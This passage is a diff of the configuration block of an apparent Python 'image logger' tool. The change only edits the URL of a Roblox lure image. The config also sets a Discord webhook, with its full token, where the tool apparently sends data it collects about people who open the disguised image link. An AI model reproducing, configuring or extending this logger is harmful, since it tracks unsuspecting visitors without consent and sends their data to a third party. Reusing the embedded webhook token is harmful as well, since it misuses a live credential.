@@ -13,7 +13,7 @@ __author__ = "Silva"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1462518479679783164/ABX3H8XpIyJuacwMwOfpQxxtq0N_8HGRgwJAouWOK-sFA2ghLsI_NZKfRnC3o1EgXHp7",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/e/ee/Roblox.jpg?20131009171704", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/e/ee/Roblox.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
